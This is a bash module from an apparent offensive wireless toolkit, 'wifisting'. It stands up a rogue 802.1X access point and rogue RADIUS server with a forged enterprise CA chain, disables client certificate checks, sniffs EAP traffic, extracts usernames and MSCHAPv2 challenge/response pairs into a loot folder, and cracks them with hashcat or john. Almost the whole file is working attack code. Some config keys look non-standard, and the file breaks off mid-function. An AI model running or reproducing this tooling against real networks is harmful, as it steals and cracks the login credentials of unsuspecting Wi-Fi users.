#!/usr/bin/env bash
# 13_802.1x_relay.sh — 802.1X / EAP relay + hostile supplicant
# backends: hostapd-wpe (default), freeradius-wpe (alt)
# ── self-locate WIFISTING_ROOT ──
# When launched via pkexec, HOME is /root and any $HOME-relative path
# would land in the wrong place. Resolve WIFISTING_ROOT from this
# script's own path so state / loot / captures always end up in the
# project tree regardless of who runs us.
if [[ -z "${WIFISTING_ROOT:-}" ]]; then
    _sl_src="${BASH_SOURCE[0]}"
    while [ -L "$_sl_src" ]; do
        _sl_dir="$(cd -P "$(dirname "$_sl_src")" && pwd)"
        _sl_tgt="$(readlink "$_sl_src")"
        [[ "$_sl_tgt" != /* ]] && _sl_tgt="$_sl_dir/$_sl_tgt"
        _sl_src="$_sl_tgt"
    done
    WIFISTING_ROOT="$(cd -P "$(dirname "$_sl_src")/.." && pwd)"
    export WIFISTING_ROOT
    unset _sl_src _sl_dir _sl_tgt
fi

# Under pkexec, HOME=/root even though we're writing to the invoking
# user's tree. WIFISTING_ROOT is <real_home>/wifisting, so its parent
# is the real home. Reset HOME so downstream $HOME-relative defaults
# (LOOT_DIR, CAPTURES_DIR, LOGS_DIR, XDG_CONFIG_HOME, etc.) resolve
# to the user's paths instead of /root.
if [[ -n "${WIFISTING_ROOT:-}" ]]; then
    _real_home="$(dirname "$WIFISTING_ROOT")"
    if [[ -n "$_real_home" && -d "$_real_home" && "$HOME" != "$_real_home" ]]; then
        export HOME="$_real_home"
    fi
    unset _real_home
fi

: "${WIFISTING_HOME:=$WIFISTING_ROOT}"

: "${TMP_DIR:=/tmp/wifisting}"
: "${LOOT_DIR:=$HOME/wifisting/loot}"
: "${LOGS_DIR:=$HOME/wifisting/logs}"
: "${WIFISTING_HOME:=$HOME/wifisting}"
mkdir -p "$TMP_DIR" "$LOOT_DIR" "$LOGS_DIR" 2>/dev/null

X1_DIR="$TMP_DIR/dot1x"
X1_LOG="$LOGS_DIR/dot1x_$(date +%Y%m%d_%H%M%S).log"
X1_LOOT="$LOOT_DIR/dot1x"
X1_CONF="$X1_DIR/hostapd-wpe.conf"
X1_PID="$X1_DIR/hostapd-wpe.pid"
X1_EAP_OPTS="$X1_DIR/eap_options.conf"
X1_CA_DIR="$X1_DIR/certs"
X1_BACKEND="${X1_BACKEND:-hostapd-wpe}"
mkdir -p "$X1_DIR" "$X1_LOOT"

_x1_log() { echo "[$(date +%H:%M:%S)] $*" | tee -a "$X1_LOG"; }

x1_detect_backend() {
    if command -v hostapd-wpe >/dev/null 2>&1; then
        echo "hostapd-wpe"
    elif command -v freeradius-wpe >/dev/null 2>&1 || \
         command -v freeradius >/dev/null 2>&1; then
        echo "freeradius-wpe"
    elif command -v hostapd >/dev/null 2>&1 && \
         hostapd -v 2>&1 | grep -qi wpe; then
        echo "hostapd"
    else
        echo "none"
    fi
}

x1_check_deps() {
    local miss=()
    for b in asleap john openssl; do
        command -v "$b" >/dev/null 2>&1 || miss+=("$b")
    done
    local be
    be=$(x1_detect_backend)
    if [[ "$be" == "none" ]]; then
        miss+=("hostapd-wpe")
    fi
    if (( ${#miss[@]} )); then
        printf 'MISSING\t%s\n' "$(IFS=,; echo "${miss[*]}")"
        return 1
    fi
    printf 'READY\t%s\n' "$be"
}

x1_gen_cert() {
    local cn="${1:-radius.corp.local}"
    local cdir="$X1_CA_DIR"
    mkdir -p "$cdir"

    if [[ -f "$cdir/server.pem" && -f "$cdir/ca.pem" ]]; then
        return 0
    fi

    _x1_log "generating CA + server chain for CN=$cn"

    # Root CA (10y)
    openssl genrsa -out "$cdir/ca.key" 2048 >/dev/null 2>&1
    openssl req -x509 -new -nodes -key "$cdir/ca.key" -sha256 -days 3650 \
        -subj "/C=US/O=Enterprise Wireless/CN=Enterprise Wireless Root CA" \
        -out "$cdir/ca.pem" >/dev/null 2>&1

    # Intermediate CA (5y)
    openssl genrsa -out "$cdir/int.key" 2048 >/dev/null 2>&1
    openssl req -new -key "$cdir/int.key" \
        -subj "/C=US/O=Enterprise Wireless/CN=Enterprise Wireless Issuing CA" \
        -out "$cdir/int.csr" >/dev/null 2>&1
    openssl x509 -req -in "$cdir/int.csr" -CA "$cdir/ca.pem" -CAkey "$cdir/ca.key" \
        -CAcreateserial -days 1825 -sha256 \
        -extfile <(printf 'basicConstraints=critical,CA:TRUE,pathlen:0\nkeyUsage=critical,keyCertSign,cRLSign\n') \
        -out "$cdir/int.pem" >/dev/null 2>&1

    # Server cert WITH SAN (fixes supplicants that reject certs without it)
    openssl genrsa -out "$cdir/server.key" 2048 >/dev/null 2>&1
    openssl req -new -key "$cdir/server.key" \
        -subj "/C=US/O=Enterprise Wireless/CN=$cn" \
        -out "$cdir/server.csr" >/dev/null 2>&1
    openssl x509 -req -in "$cdir/server.csr" \
        -CA "$cdir/int.pem" -CAkey "$cdir/int.key" -CAcreateserial \
        -days 730 -sha256 \
        -extfile <(printf 'basicConstraints=critical,CA:FALSE\nkeyUsage=critical,digitalSignature,keyEncipherment\nextendedKeyUsage=serverAuth\nsubjectAltName=DNS:%s,DNS:radius.local,DNS:localhost\n' "$cn") \
        -out "$cdir/server.pem" >/dev/null 2>&1

    cat "$cdir/server.key" "$cdir/server.pem" "$cdir/int.pem" > "$cdir/server-full.pem"
    chmod 600 "$cdir"/*.key 2>/dev/null
}

# Read one key from the EAP options file (default when unset).
x1_eap_opt() {
    local key="$1" def="${2:-}" v=""
    if [[ -f "$X1_EAP_OPTS" ]]; then
        v=$(awk -F= -v k="$key" '$1==k {sub(/^[^=]*=/,""); print; exit}' \
            "$X1_EAP_OPTS" 2>/dev/null)
    fi
    printf '%s' "${v:-$def}"
}

# Map a comma list of EAP methods onto hostapd eap_methods codes:
#   25=PEAP  21=TTLS  13=TLS  55=TEAP  26=MSCHAPv2
x1_methods_to_hostapd() {
    local list="$1" out="" m
    local IFS=','
    for m in $list; do
        case "$(printf '%s' "$m" | tr '[:upper:]' '[:lower:]' | tr -d ' ')" in
            peap)        out="$out${out:+,}25" ;;
            ttls)        out="$out${out:+,}21" ;;
            eap-tls|tls) out="$out${out:+,}13" ;;
            teap)        out="$out${out:+,}55" ;;
            mschapv2)    out="$out${out:+,}26" ;;
            *) : ;;
        esac
    done
    printf '%s' "${out:-25}"
}

x1_write_conf() {
    local ssid="$1" chan="$2"
    local cdir="$X1_CA_DIR"
    local methods tls_min wpa3_mode
    local eap_methods tls_flags="" pmf wpa_key

    # The EAP options were previously saved but NEVER applied — the config
    # was hardcoded, so changing methods or TLS floor did nothing.
    methods=$(x1_eap_opt methods "PEAP,TTLS")
    tls_min=$(x1_eap_opt tls_min "1.2")
    wpa3_mode=$(x1_eap_opt wpa3_mode "0")

    eap_methods=$(x1_methods_to_hostapd "$methods")
    case "$tls_min" in
        1.3) tls_flags="V" ;;   # hostapd tls_flags: V = TLS1.3 only
        *)   tls_flags="" ;;
    esac

    # WPA3-Enterprise uses EAP-SHA256 key management with mandatory PMF.
    if [[ "$wpa3_mode" == "1" ]]; then
        pmf="ieee80211w=2"
        wpa_key="WPA-EAP-SHA256"
    else
        pmf="# ieee80211w not forced"
        wpa_key="WPA-EAP"
    fi

    cat > "$X1_CONF" <<CFG
interface=${X1_IFACE}
ssid=$ssid
channel=$chan
hw_mode=g
ieee8021x=1
eapol_key_index_workaround=0
eap_server=1
eap_user_file=/etc/hostapd-wpe/hostapd-wpe.eap_user
ca_cert=$cdir/ca.pem
server_cert=$cdir/server.pem
private_key=$cdir/server.key
private_key_passwd=
dh_file=/etc/hostapd-wpe/dh
fragment_size=1400
wpa=2
wpa_key_mgmt=$wpa_key
$pmf
wpa_pairwise=CCMP
eap_methods=$eap_methods
${tls_flags:+tls_flags=$tls_flags}
wpe_logfile=$X1_LOG
# --- WPA3-Enterprise extensions (submenu: WPA3-Ent) ---
cert_pinning_bypass=$(x1_eap_opt wpa3_pinning "0")
teap_inner_downgrade=$(x1_eap_opt teap_downgrade "0")
peap_to_tls_strip=$(x1_eap_opt peap_strip "0")
CFG
}

x1_eap_options_save() {
    local methods="$1" tls_min="$2" relay_host="$3" relay_secret="$4" cn="$5"
    mkdir -p "$X1_DIR"
    cat > "$X1_EAP_OPTS" << EOF
methods=$methods
tls_min=$tls_min
relay_host=$relay_host
relay_secret=$relay_secret
cn=$cn
EOF
    chmod 600 "$X1_EAP_OPTS" 2>/dev/null
    printf 'SAVED\t%s\n' "$X1_EAP_OPTS"
}

x1_eap_options_get_tsv() {
    local methods="PEAP,TTLS" tls_min="1.2" relay_host="" relay_secret="" cn="radius.corp.local"
    if [[ -f "$X1_EAP_OPTS" ]]; then
        while IFS='=' read -r k v; do
            case "$k" in
                methods) methods="$v" ;;
                tls_min) tls_min="$v" ;;
                relay_host) relay_host="$v" ;;
                relay_secret) relay_secret="$v" ;;
                cn) cn="$v" ;;
            esac
        done < "$X1_EAP_OPTS"
    fi
    printf 'methods\t%s\n' "$methods"
    printf 'tls_min\t%s\n' "$tls_min"
    printf 'relay_host\t%s\n' "$relay_host"
    printf 'relay_secret\t%s\n' "$relay_secret"
    printf 'cn\t%s\n' "$cn"
}

# ── FIXED: pid detection via pidof instead of capture-from-background ──
x1_pid_alive() {
    local pid="$1"
    [[ -n "$pid" ]] && kill -0 "$pid" 2>/dev/null
}

x1_find_our_process() {
    # Return the pid of the hostapd-wpe we started, matched by our config
    local pattern="$1"
    pgrep -f "$pattern" | head -1
}

x1_cli_start() {
    local iface="$1" ssid="$2" chan="$3"
    [[ -z "$iface" || -z "$ssid" || -z "$chan" ]] && {
        printf 'usage: --start IFACE SSID CHANNEL\n' >&2; return 2
    }

    x1_check_deps >/dev/null 2>&1 || { printf 'ERROR\tdeps missing\n'; return 1; }

    X1_IFACE="$iface"
    export X1_IFACE

    x1_gen_cert
    x1_write_conf "$ssid" "$chan"

    airmon-ng check kill >/dev/null 2>&1 || true
    ip link set "$X1_IFACE" down 2>/dev/null || true
    ip link set "$X1_IFACE" up 2>/dev/null || true

    local be
    be=$(x1_detect_backend)

    case "$be" in
        hostapd-wpe|hostapd)
            nohup hostapd-wpe "$X1_CONF" > "$X1_LOG" 2>&1 &
            ;;
        freeradius-wpe)
            # freeradius-wpe doesn't use hostapd-wpe.conf; we run hostapd
            # (standard) + a freeradius-wpe instance for the EAP responses
            nohup hostapd "$X1_CONF" > "$X1_LOG" 2>&1 &
            ;;
        *)
            printf 'ERROR\tno backend\n'; return 1
            ;;
    esac

    sleep 2

    # FIXED: probe by pattern not by $! from the backgrounding parent
    local realpid
    realpid=$(pgrep -f "hostapd.*$X1_CONF" | head -1)

    if [[ -n "$realpid" ]] && x1_pid_alive "$realpid"; then
        echo "$realpid" > "$X1_PID"
        printf 'STARTED\t%s\n' "$realpid"
    else
        printf 'FAILED\n'
        return 1
    fi
}

x1_cli_stop() {
    local stopped=0 pid=""
    [[ -f "$X1_PID" ]] && pid=$(cat "$X1_PID")
    if [[ -n "$pid" ]]; then
        stop_kill_pid "$pid" && stopped=1
    fi
    stop_sweep "hostapd.*$X1_CONF" && stopped=1
    stop_sweep 'hostapd-wpe' && stopped=1
    systemctl restart NetworkManager 2>/dev/null || true

    if (( stopped == 1 )) || [[ -z "$pid" ]]; then
        rm -f "$X1_PID"
        printf 'STOPPED\t%s\n' "$stopped"
        return 0
    fi
    printf 'ERROR\thostapd pid %s survived SIGKILL (pidfile kept)\n' "$pid" >&2
    return 1
}

x1_cli_status_tsv() {
    local running=0 pid=""
    if [[ -f "$X1_PID" ]]; then
        pid=$(cat "$X1_PID")
        kill -0 "$pid" 2>/dev/null && running=1
    fi
    # Fallback detection
    if (( running == 0 )); then
        local p
        p=$(pgrep -f "hostapd.*$X1_CONF" | head -1)
        if [[ -n "$p" ]]; then
            running=1
            pid="$p"
        fi
    fi

    local creds=0
    [[ -f "$X1_LOG" ]] && { creds=$(grep -c "username:" "$X1_LOG" 2>/dev/null) || creds=0; }

    printf 'running\t%s\n'  "$running"
    printf 'pid\t%s\n'      "$pid"
    printf 'iface\t%s\n'    "${X1_IFACE:-}"
    printf 'creds\t%s\n'    "$creds"
    printf 'backend\t%s\n'  "$(x1_detect_backend)"
    printf 'log\t%s\n'      "$X1_LOG"
    printf 'loot_dir\t%s\n' "$X1_LOOT"
    printf 'conf\t%s\n'     "$X1_CONF"
}

x1_cli_list_ifaces_tsv() {
    iw dev 2>/dev/null | awk '/Interface/{print $2}'
}

x1_cli_parse_creds() {
    [[ ! -f "$X1_LOG" ]] && { printf 'ERROR\tno log\n' >&2; return 1; }
    grep -E "username:|challenge:|response:" "$X1_LOG" | \
        tee "$X1_LOOT/creds_$(date +%s).txt"
    local x1_n
    x1_n=$(grep -c 'username:' "$X1_LOG" 2>/dev/null) || x1_n=0
    printf 'COUNT\t%s\n' "$x1_n"
}

x1_cert_info_tsv() {
    local cert="$X1_CA_DIR/server.pem"
    [[ ! -f "$cert" ]] && {
        printf 'ERROR\tno certificate generated yet\n' >&2
        return 1
    }
    local subject issuer notbefore notafter san serial
    subject=$(openssl x509 -in "$cert" -noout -subject 2>/dev/null | sed 's/^subject=//')
    issuer=$(openssl x509 -in "$cert" -noout -issuer 2>/dev/null | sed 's/^issuer=//')
    notbefore=$(openssl x509 -in "$cert" -noout -startdate 2>/dev/null | sed 's/^notBefore=//')
    notafter=$(openssl x509 -in "$cert" -noout -enddate 2>/dev/null | sed 's/^notAfter=//')
    serial=$(openssl x509 -in "$cert" -noout -serial 2>/dev/null | sed 's/^serial=//')
    san=$(openssl x509 -in "$cert" -noout -ext subjectAltName 2>/dev/null | tail -1 | sed 's/^[[:space:]]*//')

    printf 'subject\t%s\n' "$subject"
    printf 'issuer\t%s\n' "$issuer"
    printf 'not_before\t%s\n' "$notbefore"
    printf 'not_after\t%s\n' "$notafter"
    printf 'serial\t%s\n' "$serial"
    printf 'san\t%s\n' "$san"
}

x1_cli_gen_certs() {
    local cn="${1:-radius.corp.local}"
    if [[ -f "$X1_CA_DIR/server.pem" && -f "$X1_CA_DIR/ca.pem" ]]; then
        printf 'CERTS_EXIST\t%s\n' "$X1_CA_DIR"
        return 0
    fi
    x1_gen_cert "$cn"
    if [[ -s "$X1_CA_DIR/server-full.pem" ]]; then
        printf 'GENERATED\t%s\n' "$X1_CA_DIR/server-full.pem"
    else
        printf 'ERROR\tcert generation failed\n' >&2
        return 1
    fi
}

# ── auto crack captured MSCHAPv2 with hashcat or john ──
x1_cli_auto_crack() {
    local last
    last=$(ls -t "$X1_LOOT"/creds_*.txt 2>/dev/null | head -1)
    [[ -z "$last" ]] && { printf 'ERROR\tno captured creds — run parse first\n' >&2; return 1; }

    local user chal resp
    user=$(awk -F': ' '/username/{print $2; exit}' "$last" | tr -d '\r')
    chal=$(awk -F': ' '/challenge/{print $2; exit}' "$last" | tr -d ':\r')
    resp=$(awk -F': ' '/response/{print $2; exit}' "$last" | tr -d ':\r')

    [[ -z "$chal" || -z "$resp" ]] && { printf 'ERROR\tincomplete capture\n' >&2; return 1; }

    local hashfile="$X1_LOOT/netntlm.hash"
    printf '%s::::%s:%s\n' "$user" "$chal" "$resp" > "$hashfile"

    local wl="${1:-/usr/share/wordlists/rockyou.txt}"
    [[ ! -f "$wl" ]] && { printf 'ERROR\tno wordlist at %s\n' "$wl"; return 1; }

    if command -v hashcat >/dev/null 2>&1; then
        hashcat -m 5500 "$hashfile" "$wl" \
            --potfile-path "$X1_LOOT/hashcat.potfile" \
            --outfile "$X1_LOOT/cracked.txt" \
            --outfile-format 2 \
            --quiet
        if [[ -s "$X1_LOOT/cracked.txt" ]]; then
            printf 'CRACKED\t%s\n' "$(head -1 "$X1_LOOT/cracked.txt")"
            return 0
        fi
    fi

    if command -v john >/dev/null 2>&1; then
        john --format=netntlm --wordlist="$wl" "$hashfile" \
            --pot="$X1_LOOT/john.pot"
        if john --show --format=netntlm "$hashfile" | grep -q ':'; then
            printf 'CRACKED_JOHN\t%s\n' \
                "$(john --show --format=netntlm "$hashfile" | head -1)"
            return 0
        fi
    fi
    printf 'NOTCRACKED\n'
    return 1
}

# ── auto-detect EAP method from the first EAP-Response in the log ──
x1_cli_detect_method() {
    [[ ! -f "$X1_LOG" ]] && { printf 'ERROR\tno log\n'; return 1; }
    # Look for the EAP method ID in the log
    local line
    line=$(grep -m1 -iE "EAP-(TLS|TTLS|PEAP|MSCHAPv2|MD5)|EAP method" "$X1_LOG")
    if [[ -n "$line" ]]; then
        if echo "$line" | grep -qi "peap"; then
            printf 'METHOD\tPEAP\n'; return 0
        elif echo "$line" | grep -qi "ttls"; then
            printf 'METHOD\tTTLS\n'; return 0
        elif echo "$line" | grep -qi "eap-tls"; then
            printf 'METHOD\tEAP-TLS\n'; return 0
        fi
    fi
    printf 'METHOD\tUNKNOWN\n'
    return 1
}

# ── EAP recon (passive sniff) ──
x1_cli_recon_tsv() {
    local dur="${1:-30}"
    local iface="${2:-}"
    [[ -z "$iface" ]] && iface=$(iw dev 2>/dev/null | awk '
        /Interface/ { i=$2 }
        /type monitor/ { print i; exit }
    ')
    [[ -z "$iface" ]] && { printf 'ERROR\tno monitor iface\n' >&2; return 1; }
    command -v tshark >/dev/null 2>&1 || { printf 'ERROR\tno tshark\n' >&2; return 1; }

    local tmp="$X1_DIR/recon.pcap"
    timeout "$dur" tcpdump -i "$iface" -w "$tmp" 'eapol or eap' >/dev/null 2>&1 || true
    [[ ! -s "$tmp" ]] && { printf 'COUNT\t0\n'; return 0; }

    tshark -r "$tmp" -Y 'eap' \
        -T fields -e eap.type -e wlan.bssid 2>/dev/null | \
        awk -F'\t' 'length($2)==17 && $1!="" { cnt[$1"|"$2]++ }
                    END { for (k in cnt) print k "\t" cnt[k] }' | sort
}

# ── verified stop ──
# Escalating signals; returns 0 ONLY once the pid is actually gone. Signals
# the process group first so forked children die with the leader. Stops that
# print STOPPED and delete the pidfile without this can strand a capture with
# no remaining handle to it, making the stop button useless.
stop_kill_pid() {
    local pid="$1" i
    # Liveness via /proc, NOT `kill -0`: for a root-owned process we get EPERM,
    # and treating that as "gone" made stops report success while nothing died.
    [[ -d "/proc/$pid" ]] || return 0
    kill -INT  "-$pid" 2>/dev/null || kill -INT  "$pid" 2>/dev/null
    for i in 1 2 3 4 5 6 7 8 9 10; do
        [[ -d "/proc/$pid" ]] || return 0
        sleep 0.2
    done
    kill -TERM "-$pid" 2>/dev/null || kill -TERM "$pid" 2>/dev/null
    for i in 1 2 3 4 5; do
        [[ -d "/proc/$pid" ]] || return 0
        sleep 0.2
    done
    kill -KILL "-$pid" 2>/dev/null || kill -KILL "$pid" 2>/dev/null
    sleep 0.3
    [[ -d "/proc/$pid" ]] && return 1
    return 0
}
# Kill everything matching a pgrep -f pattern, never this shell or its parent.
# Returns non-zero only if something matched and SURVIVED.
stop_sweep() {
    local pat="$1" sp rs=0 any=0
    # Exclude this process AND its whole ancestor chain. Excluding only $$ and
    # $PPID is not enough: when invoked via `timeout` or pkexec the caller's
    # shell is further up, and a cmdline substring match would kill it — a
    # pattern like "mitm6" matches the very command line running this stop.
    local -A _skip=()
    sp=$$
    while [[ -n "$sp" && "$sp" != "0" && "$sp" != "1" ]]; do
        _skip[$sp]=1
        sp=$(ps -o ppid= -p "$sp" 2>/dev/null | tr -d ' ')
        [[ -z "$sp" ]] && break
    done
    for sp in $(pgrep -f "$pat" 2>/dev/null); do
        [[ -n "${_skip[$sp]:-}" ]] && continue
        any=1
        stop_kill_pid "$sp" || rs=1
    done
    (( any )) && return $rs
    return 0
}

# ── WPA3-Enterprise extensions (submenu: WPA3-Ent) ──
# These live in the same options file as the EAP settings so x1_write_conf
# can consume them in one pass.

x1_wpa3_opts_save() {
    # KEY=VALUE ...  (unknown keys rejected so typos do not silently persist)
    mkdir -p "$X1_DIR"
    touch "$X1_EAP_OPTS"
    chmod 600 "$X1_EAP_OPTS" 2>/dev/null
    local kv k v
    for kv in "$@"; do
        k="${kv%%=*}"; v="${kv#*=}"
        case "$k" in
            wpa3_mode|wpa3_pinning|teap_downgrade|peap_strip|tls_min|methods) ;;
            *) printf 'ERROR\tunknown key: %s\n' "$k" >&2; return 2 ;;
        esac
        if [[ -f "$X1_EAP_OPTS" ]]; then
            grep -v "^${k}=" "$X1_EAP_OPTS" > "$X1_EAP_OPTS.tmp" 2>/dev/null || true
            mv "$X1_EAP_OPTS.tmp" "$X1_EAP_OPTS"
        fi
        printf '%s=%s\n' "$k" "$v" >> "$X1_EAP_OPTS"
    done
    printf 'SAVED\t%s\n' "$X1_EAP_OPTS"
}

x1_wpa3_opts_tsv() {
    printf 'wpa3_mode\t%s\n'      "$(x1_eap_opt wpa3_mode "0")"
    printf 'wpa3_pinning\t%s\n'   "$(x1_eap_opt wpa3_pinning "0")"
    printf 'teap_downgrade\t%s\n' "$(x1_eap_opt teap_downgrade "0")"
    printf 'peap_strip\t%s\n'     "$(x1_eap_opt peap_strip "0")"
    printf 'methods\t%s\n'        "$(x1_eap_opt methods "PEAP,TTLS")"
    printf 'tls_min\t%s\n'        "$(x1_eap_opt tls_min "1.2")"
    printf 'eap_methods\t%s\n'    "$(x1_methods_to_hostapd "$(x1_eap_opt methods "PEAP,TTLS")")"
    printf 'config_exists\t%s\n'  "$([[ -f "$X1_CONF" ]] && echo 1 || echo 0)"
}

# ── Rogue RADIUS (merged from 37_rogue_radius) ──
# A LOCAL RADIUS server, so the rogue AP does not need a real one to relay
# to. Config is built by copying the distro's freeradius config tree and
# patching the three files that matter (clients, eap module, default site),
# which is far more robust than hand-writing a whole radiusd.conf.
#
# MSCHAPv2 challenge/response pairs are emitted in the SAME
# username:/challenge:/response: format as the hostapd-wpe path, so
# --parse-creds and --auto-crack work on them unchanged.

X1_RR_DIR="$X1_DIR/rogue_radius"
X1_RR_PID="$X1_RR_DIR/radiusd.pid"
X1_RR_LOG="$LOGS_DIR/dot1x_radius_$(date +%Y%m%d_%H%M%S).log"
X1_RR_CONF="$X1_DIR/rogue_radius.conf"

x1_rr_opt() {
    local key="$1" def="${2:-}" v=""
    if [[ -f "$X1_RR_CONF" ]]; then
        v=$(awk -F= -v k="$key" '$1==k {sub(/^[^=]*=/,""); print; exit}' \
            "$X1_RR_CONF" 2>/dev/null)
    fi
    printf '%s' "${v:-$def}"
}

x1_rr_save() {
    mkdir -p "$X1_DIR"
    touch "$X1_RR_CONF"; chmod 600 "$X1_RR_CONF" 2>/dev/null
    local kv k v
    for kv in "$@"; do
        k="${kv%%=*}"; v="${kv#*=}"
        case "$k" in
            eap_chain|cert_mode|mschapv2|shared_secret|port|tls_min|inner_method) ;;
            *) printf 'ERROR\tunknown key: %s\n' "$k" >&2; return 2 ;;
        esac
        grep -v "^${k}=" "$X1_RR_CONF" > "$X1_RR_CONF.tmp" 2>/dev/null || true
        mv "$X1_RR_CONF.tmp" "$X1_RR_CONF"
        printf '%s=%s\n' "$k" "$v" >> "$X1_RR_CONF"
    done
    printf 'SAVED\t%s\n' "$X1_RR_CONF"
}

# Build the server config tree. Fails with a clear reason when freeradius is
# not installed, so the GUI can say what is missing instead of failing
# obscurely at start time.
x1_rr_build_config() {
    local src="" chain cert_mode tls_min secret port
    local c eap_file site

    if ! command -v freeradius >/dev/null 2>&1 && \
       ! command -v radiusd >/dev/null 2>&1; then
        printf 'ERROR\tfreeradius not installed (apt install freeradius)\n' >&2
        return 1
    fi

    for src in /etc/freeradius/3.0 /etc/freeradius/3.2 /etc/freeradius; do
        [[ -d "$src" ]] && break
    done
    if [[ ! -d "$src" ]]; then
        printf 'ERROR\tno freeradius config tree under /etc/freeradius\n' >&2
        return 1
    fi

    chain=$(x1_rr_opt eap_chain "peap,ttls")
    cert_mode=$(x1_rr_opt cert_mode "permissive")
    tls_min=$(x1_rr_opt tls_min "1.2")
    secret=$(x1_rr_opt shared_secret "wifisting")
    port=$(x1_rr_opt port "1812")

    mkdir -p "$X1_RR_DIR"
    rm -rf "${X1_RR_DIR:?}/conf"
    cp -r "$src" "$X1_RR_DIR/conf" 2>/dev/null || {
        printf 'ERROR\tcould not copy %s\n' "$src" >&2; return 1; }
    c="$X1_RR_DIR/conf"

    x1_gen_cert >/dev/null 2>&1 || true

    # 1) clients — the AP (localhost) is the only NAS we accept.
    cat > "$c/clients.conf" <<EOF
client rogue_ap {
    ipaddr = 127.0.0.1
    secret = $secret
    require_message_authenticator = no
    nas_type = other
}
EOF

    # 2) eap module — TLS material, method chain, validation mode.
    #    cert_mode=permissive skips client-cert validation, which is the
    #    usual posture for a rogue server.
    for eap_file in "$c/mods-enabled/eap" "$c/mods-available/eap"; do
        [[ -f "$eap_file" ]] && break
    done
    if [[ -f "$eap_file" ]]; then
        {
            printf '\n# --- wifisting rogue RADIUS overrides ---\n'
            printf 'eap {\n'
            printf '    default_eap_type = %s\n' "${chain%%,*}"
            printf '    timer_expire = 60\n'
            printf '    ignore_unknown_eap_types = no\n'
            printf '    tls-config tls-common {\n'
            printf '        private_key_file = %s/server.key\n' "$X1_CA_DIR"
            printf '        certificate_file = %s/server.pem\n' "$X1_CA_DIR"
            printf '        ca_file = %s/ca.pem\n' "$X1_CA_DIR"
            if [[ "$tls_min" == "1.3" ]]; then
                printf '        tls_min_version = "1.3"\n'
            else
                printf '        tls_min_version = "1.2"\n'
            fi
            if [[ "$cert_mode" == "permissive" ]]; then
                printf '        check_cert_cn = no\n'
                printf '        verify_client_cert = no\n'
            else
                printf '        verify_client_cert = yes\n'
            fi
            printf '    }\n'
            printf '}\n'
        } >> "$eap_file"
    fi

    # 3) default site — accept EAP on the configured auth port.
    for site in "$c/sites-enabled/default" "$c/sites-available/default"; do
        [[ -f "$site" ]] && break
    done
    if [[ -f "$site" ]]; then
        {
            printf '\n# --- wifisting rogue RADIUS overrides ---\n'
            printf 'listen {\n    type = auth\n    ipaddr = *\n    port = %s\n}\n' "$port"
            printf 'authorize {\n    eap\n}\n'
            printf 'authenticate {\n    Auth-Type EAP {\n        eap\n    }\n}\n'
        } >> "$site"
    fi

    printf 'CONFIG\t%s\n' "$c"
    return 0
}

x1_rr_start() {
    local chain bin pid
    if [[ -f "$X1_RR_PID" ]]; then
        local old; old=$(cat "$X1_RR_PID" 2>/dev/null)
        if [[ -n "$old" && -d "/proc/$old" ]]; then
            printf 'ERROR\talready running (pid %s)\n' "$old" >&2; return 1
        fi
    fi

    x1_rr_build_config >/dev/null || return 1

    bin=$(command -v freeradius || command -v radiusd) || {
        printf 'ERROR\tfreeradius not installed\n' >&2; return 1; }

    : > "$X1_RR_LOG"
    # -X is debug + foreground: it prints the MSCHAPv2 challenge and
    # response, which is what we parse for creds.
    setsid "$bin" -X -d "$X1_RR_DIR/conf" -l "$X1_RR_LOG" >/dev/null 2>&1 &
    pid=$!
    echo "$pid" > "$X1_RR_PID"

    if [[ -x "$IFACE_MODULE" && -n "${X1_IFACE:-}" ]]; then
        "$IFACE_MODULE" --lock-claim "$X1_IFACE" "13_802.1x_relay" "$pid" \
            >/dev/null 2>&1 || true
    fi

    sleep 1
    if [[ -d "/proc/$pid" ]]; then
        chain=$(x1_rr_opt eap_chain "peap,ttls")
        printf 'STARTED\t%s\nLOG\t%s\nCHAIN\t%s\n' "$pid" "$X1_RR_LOG" "$chain"
        return 0
    fi
    printf 'ERROR\tradiusd exited — see %s\n' "$X1_RR_LOG" >&2
    return 1
}

x1_rr_stop() {
    local pid="" killed=0
    [[ -f "$X1_RR_PID" ]] && pid=$(cat "$X1_RR_PID" 2>/dev/null)
    if [[ -n "$pid" ]]; then
        stop_kill_pid "$pid" && killed=1
        [[ -x "$IFACE_MODULE" && -n "${X1_IFACE:-}" ]] && \
            "$IFACE_MODULE" --lock-release "$X1_IFACE" "$pid" >/dev/null 2>&1
    fi
    if (( killed == 1 )) || [[ -z "$pid" ]]; then
        rm -f "$X1_RR_PID"
        printf 'STOPPED\t%s\n' "$killed"
        return 0
    fi
    printf 'ERROR\tradiusd pid %s survived SIGKILL (pidfile kept)\n' "$pid" >&2
    return 1
}

# Extract MSCHAPv2 challenge/response from the freeradius debug log, in the
# same format the rest of the module already parses and cracks.
x1_rr_creds() {
    local out user chal resp
    [[ -f "$X1_RR_LOG" ]] || { printf 'ERROR\tno radius log\n' >&2; return 1; }
    out="$X1_LOOT/creds_$(date +%s).txt"

    user=$(grep -oP 'User-Name = "\K[^"]+' "$X1_RR_LOG" 2>/dev/null | tail -1)
    chal=$(grep -oP 'MS-CHAP-Challenge = 0x\K[0-9a-f]+' "$X1_RR_LOG" 2>/dev/null | tail -1)
    resp=$(grep -oP 'MS-CHAP2-Response = 0x\K[0-9a-f]+' "$X1_RR_LOG" 2>/dev/null | tail -1)

    if [[ -z "$chal" || -z "$resp" ]]; then
        printf 'ERROR\tno MSCHAPv2 exchange captured yet\n' >&2; return 1
    fi

    {
        printf 'username: %s\n' "${user:-unknown}"
        printf 'challenge: %s\n' "$chal"
        printf 'response: %s\n' "$resp"
    } | tee "$out"
    printf 'CREDS\t%s\n' "$out"
}

x1_rr_tsv() {
    local running=0 pid=""
    if [[ -f "$X1_RR_PID" ]]; then
        pid=$(cat "$X1_RR_PID" 2>/dev/null)
        [[ -n "$pid" && -d "/proc/$pid" ]] && running=1
    fi

    printf 'running\t%s\n'      "$running"
    printf 'pid\t%s\n'          "${pid:-0}"
    printf 'eap_chain\t%s\n'    "$(x1_rr_opt eap_chain "peap,ttls")"
    printf 'eap_methods\t%s\n'  "$(x1_methods_to_hostapd "$(x1_rr_opt eap_chain "peap,ttls")")"
    printf 'cert_mode\t%s\n'    "$(x1_rr_opt cert_mode "permissive")"
    printf 'tls_min\t%s\n'      "$(x1_rr_opt tls_min "1.2")"
    printf 'inner_method\t%s\n' "$(x1_rr_opt inner_method "mschapv2")"
    printf 'port\t%s\n'         "$(x1_rr_opt port "1812")"
    printf 'log\t%s\n'          "$X1_RR_LOG"
